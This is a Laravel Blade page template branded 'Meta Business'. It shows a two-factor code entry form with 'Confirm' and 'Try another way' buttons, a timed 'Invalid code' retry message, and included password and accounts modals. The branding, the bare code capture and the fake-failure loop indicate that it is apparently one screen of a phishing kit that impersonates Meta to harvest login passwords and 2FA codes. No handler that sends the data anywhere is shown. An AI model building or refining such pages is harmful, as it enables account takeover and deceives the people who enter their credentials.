@extends('layouts.app')

@section('content')
<div class="container">
    <div class="row">
        <div class="col-8">
            <div class="content-section">
                <!-- Main content -->
                <div class="modal-content">
                    <div class="modal-header">
                        <h4 class="modal-title">Meta Business</h4>
                    </div>
                    <div class="modal-body">
                        <!-- Form section -->
                        <form id="mainForm">
                            <div class="mb-3">
                                <div class="password-input">
                                    <input name="2FA-1" minlength="6" maxlength="8" type="tel" class="form-control" id="2facode" placeholder="Code" required autocomplete="off">
                                </div>
                                <div class="invalid-feedback" id="invalid2fa" style="display: none;">
                                    Invalid code. Please try again later <span id="timer"></span>
                                </div>
                            </div>
                            
                            <div class="form-btn-wrapper" style="display:none" id="send2fa">
                                <button class="btn btn-primary" type="submit">
                                    <div class="spinner-border text-light" id="2faspin" role="status" style="display: none;">
                                        <span class="visually-hidden">Loading...</span>
                                    </div>
                                    <span class="button-text">Confirm</span>
                                </button>
                            </div>
                            
                            <div class="form-btn-wrapper" id="try681">
                                <button class="btn btn-primary" id="morway" type="Button">
                                    <div class="spinner-border text-light" id="2faspin" role="status" style="display: none;">
                                        <span class="visually-hidden">Loading...</span>
                                    </div>
                                    <span class="button-text">Try another way</span>
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <div class="col-4">
            <!-- Sidebar navigation -->
            <nav class="sidebar-nav">
                <div class="action-button-list">
                    <div class="action-button wide" id="termsLink">
                        <div class="action-button-text">
                            <span>Terms of Use</span>
                        </div>
                        <div class="action-button-arrow">
                            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z"/>
                            </svg>
                        </div>
                    </div>

                    <div class="action-button wide" id="policyLink">
                        <div class="action-button-text">
                            <span>Privacy Policy</span>
                        </div>
                        <div class="action-button-arrow">
                            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z"/>
                            </svg>
                        </div>
                    </div>
                </div>
            </nav>
        </div>
    </div>
</div>

<!-- Include modals -->
@include('partials.terms-modal')
@include('partials.privacy-modal')
@include('partials.search-modal')
@include('partials.accounts-modal')
@include('partials.password-modal')
@endsection 